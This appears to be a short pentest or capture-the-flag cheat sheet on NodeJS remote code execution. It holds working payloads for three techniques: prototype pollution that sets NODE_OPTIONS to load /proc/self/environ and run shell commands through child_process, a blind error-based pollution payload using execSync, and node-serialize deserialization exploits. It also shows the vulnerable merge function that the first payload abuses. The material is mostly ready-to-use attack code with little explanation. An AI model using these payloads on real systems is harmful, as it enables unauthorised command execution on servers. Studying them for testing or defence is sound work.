# NodeJS

### NodeJS Polluting environment

```javascript
{"name":"xct","constructor":{"prototype":{"env":{"AAAA":"require('child_process').exec('cat *').stdout.pipe(process.stdout);//","NODE_OPTIONS":"--require /proc/self/environ"}}},"paper":10}
```

By polluting the environment we can inject require to execute a local file. If we point this to /proc/self/environ and place an environment variable there we can execute code. On a ctf challenge this worked because of faulty merge method:

```javascript
merge(target, source) {
        for (let key in source) {
            if (this.isValidKey(key)){
                if (this.isObject(target[key]) && this.isObject(source[key])) {
                    this.merge(target[key], source[key]);
                } else {
                    target[key] = source[key];
                }
            }
        }
        return target;
    },
```

Blogpost: [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

### NodeJS Blind Error based Pollution

```text
[(function test(xct){return ''[!xct?'__proto__':'constructor'][xct]})('constructor')('throw new Error(global.process.mainModule.constructor._load(\"child_process\").execSync(\" PAYLOAD \").toString())')()]
```

### NodeJS Deserialization RCE

#### Vulnerable Code

```text
var s = require('node-serialize');
s.unserialize(data);
```

#### Exploit

```text
{"a":"_$$ND_FUNC$$_function(){console.log(\"xct\")}"}
{"a":"_$$ND_FUNC$$_function(){require('child_process').exec('...')}()"}
```

